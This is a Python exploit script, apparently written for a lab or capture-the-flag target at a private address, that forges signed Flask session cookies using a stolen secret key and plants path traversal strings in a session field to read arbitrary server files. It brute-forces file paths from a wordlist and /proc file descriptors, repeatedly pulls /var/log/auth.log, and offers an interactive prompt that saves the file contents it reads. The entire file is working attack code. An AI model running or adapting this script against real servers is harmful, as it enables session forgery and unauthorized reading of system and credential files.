import time
import requests
from flask.sessions import SecureCookieSessionInterface

obtained_secret = "your-personal-access-token"

port = 51737
cookie_string_template = "PHPSESSID=61aqgh4j696t3fl66g3kvipm6r; session={0}"
from base64 import b64encode, b64decode
import requests
import flask_unsign
import hashlib
import sys

class FlaskMockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key

def session_cookie_encoder(secret_key, session_cookie_structure):
    try:
        app = FlaskMockApp(secret_key)
        si = SecureCookieSessionInterface()
        s = si.get_signing_serializer(app)

        return s.dumps(session_cookie_structure)
    except Exception as e:
        return "[Encoding error]{}".format(e)

def getHeaders(payload, redirect):
    signed_cookie = session_cookie_encoder(obtained_secret, {'last_news_txt': payload, 'redirect': redirect})
    cookie_header = cookie_string_template.format(signed_cookie)
    custom_headers = {
            "Cookie": cookie_header,
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0"
    }
    return custom_headers

def submitPayload(headers):
    try:
        response = requests.get("http://192.168.120.11:"+str(port)+"/", headers=headers)
        if "Internal Server" not in response.text:
            print(response.text)
            return response.text
    except Exception as ex:
        print(ex)

def bfPath(name):
    with open(name) as file:
        for line in file:
            line=line.rstrip()
            if len(line) > 0:
                print(f"Trying {line}")
                submitPayload(getHeaders('../../../../../'+line, 'news'))

def bfProc():
    for i in range(0,9999):
        print(i)
        res = submitPayload(getHeaders('../../../../../proc/self/16/fd/'+str(i), 'news'))
        if res:
            exit()
            
def bfSSH():
    for i in range(0,99999):
        res = submitPayload(getHeaders('../../../../../var/log/auth.log', 'news'))
        time.sleep(5)

while True:
    try:
        #bfProc()
        #bfPath("paths.txt")
        bfSSH()
        payload = input("Enter payload> ")
        res = submitPayload(getHeaders("../../../../../"+payload, "news"))
        if res:
            f = open("out.txt", "a")
            f.write(res)
            f.close()
    except Exception as ex:
        print(ex)